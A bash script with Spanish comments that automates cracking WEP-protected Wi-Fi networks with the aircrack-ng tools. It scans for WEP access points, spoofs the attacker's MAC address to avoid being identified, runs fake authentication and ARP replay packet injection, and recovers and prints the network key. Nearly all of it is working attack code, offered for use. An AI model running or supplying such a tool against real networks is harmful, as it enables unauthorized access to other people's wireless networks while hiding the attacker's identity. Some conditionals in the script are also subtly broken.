#!/bin/bash
# Redux supercutre de airoscript usando Arp Replay.
trap clean EXIT

verde() { echo -ne "\e[32m# $1\e[m"; }

RND="cap$RANDOM$RANDOM"

# Esto dejará todo el patio limpio.
clean() {
    verde "Bajando adaptadores en modo monitor:\n"
    airmon-ng | sed -n 's@^\(mon[0-9]\+\).*@\1@p'| xargs -n1 airmon-ng stop | grep -v '^$'
    verde "Limpiando temporales:\n"
    rm -v $RND-* replay_arp* 2>/dev/null
    exit 0
}

# Esto necesita poderes místicos.
[ $USER = "root" ] || exit 1

# Lanzamos wlan en modo monitor para buscar ESSIDs.
verde "Iniciamos Adaptador, escribiremos en ${RND}.*"
airmon-ng start wlan0
airodump-ng -w $RND mon0

# Listamos los aps bajo WEP detectados.
verde "APs detectados:\n"
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
if [ "$PRIVACY" = " WEP " ]; then
    i=$(($i+1))
    echo -e "$i)  $MAC\t$CHANNEL\t$PRIVACY\t$POWER\t$ESSID"
    aessid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
fi
done < $RND-01.csv
[ $i > 0 ] || exit 1
verde "Seleccionar AP del 1 al $i:\n"
read choice
[ -z ${amac[$choice]} ] && exit 1:

# No tengo huevos de martillar el AP con mi mac.
verde "Falseando MAC:\n"
ifconfig mon0 down
macchanger -m 00:11:22:33:44:55 mon0
ifconfig mon0 up

# Creamos un fichero .screenrc custom para 'splitear' aireplay/airodump en una sesión de screen.
cat > ${RND}.screen <<EOF
startup_message off
sleep 3
screen -t auth aireplay-ng -1 6000 -o 1 -q 10 -e ${aessid[$choice]} -a ${amac[$choice]} -h 00:11:22:33:44:55 mon0
split
focus
screen -t replay aireplay-ng -3 -b ${amac[$choice]} -h 00:11:22:33:44:55 mon0
split
focus
screen -t dump airodump-ng -c ${achannel[$choice]} --bssid ${amac[$choice]} -w $RND mon0
EOF

# Efectuamos el ataque en si.
verde "Ataque ARP REPLAY\n"
screen -S wepfrit -c $RND.screen

# Buscamos las clave con los IV obtenidos.
verde "Búsqueda de clave por método PTW\n"
screen -S aircrack aircrack-ng -z -b ${amac[$choice]} -l ${aessid[$choice]}.key ${RND}*.cap

# Presentamos la clave si aplica.
[ -f ${aessid[$choice]}.key ] && { verde "Clave encontrada:\n "; cat ${aessid[$choice]}.key; echo ; }
